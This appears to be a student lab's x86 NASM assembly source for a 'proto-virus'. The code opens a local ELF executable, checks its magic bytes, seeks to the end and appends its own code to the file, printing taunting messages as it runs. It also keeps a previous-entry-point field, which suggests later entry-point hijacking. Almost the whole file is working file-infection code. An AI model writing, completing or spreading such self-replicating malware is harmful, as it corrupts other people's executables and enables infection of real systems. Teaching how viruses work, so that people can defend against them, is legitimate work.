%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ebx, %2
	mov	eax, %1
    mov ecx, %3
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro


%macro  lbl_rel_addr 1
    call get_my_loc
    sub esi, next_i - %1
%endmacro

;%1 = error msg (lbl)
;%2 = msg length
%macro print_error 2
    lbl_rel_addr %1
    write 2, esi, %2
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
	
global _start

section .text

_start:	
    push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            

; print a scary virusy message to stdout
    lbl_rel_addr IAmVirus
    write 1, esi, err_openFile - IAmVirus

; open file 
    lbl_rel_addr FileName
    open esi, RDWR, 0


; check if file was read correctly (eax > 0)
    cmp dword eax, 0
    jle fail_openFile
    mov [ebp - 4], eax      ;save eax on stack
        
; file was opened correctly
; lets read the file
    mov edi, ebp
    sub edi, 8          ; make room for magic numbers in file
    read [ebp - 4], edi, 4  ;read 4 bytes to ebx (stack)
    
; check if 4 bytes were read
    cmp eax, 4
    jne fail_readFile

; check if the 4 bytes read represent a ELF file
    cmp byte [ebp - 5], 'F'
    jne fail_notELF
    cmp byte [ebp - 6], 'L'
    jne fail_notELF
    cmp byte [ebp - 7], 'E'
    jne fail_notELF
        
; *** we have a ELF File ***

; write to Our Virus Into The File!!!
    lseek [ebp - 4], 0, SEEK_END    ;find the eof
    mov dword [ebp - 8], eax        ;eax = size of file (usefull number :) )
    lbl_rel_addr _start
    write [ebp - 4], esi, virus_end - _start
    
        
VirusExit:
    lbl_rel_addr Boom
    write 1, esi, IAmVirus - Boom 
    close [ebp - 4]
    exit 0            
                         
fail_openFile:
    print_error err_openFile, err_readFile - err_openFile
    exit 1
    
fail_readFile:
    print_error err_readFile, err_notELF - err_readFile
    close [ebp - 4]
    exit 1
    
fail_notELF:
    print_error err_notELF, Failstr - err_notELF
    close [ebp - 4]
    exit 1
            
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Boom:       db "Boom!!! GotCha!!!", 10, 0
IAmVirus:       db "This Is Sparta!!!!!!", 10, 0
err_openFile:   db "Failed Opening File", 10, 0
err_readFile:   db "Failed Reading File", 10, 0
err_notELF:     db "File Is Not An ELF File", 10, 0
Failstr:        db "perhaps not", 10 , 0

get_my_loc:
    call next_i
next_i:
    pop esi
    ret

PreviousEntryPoint: dd VirusExit
virus_end:

 
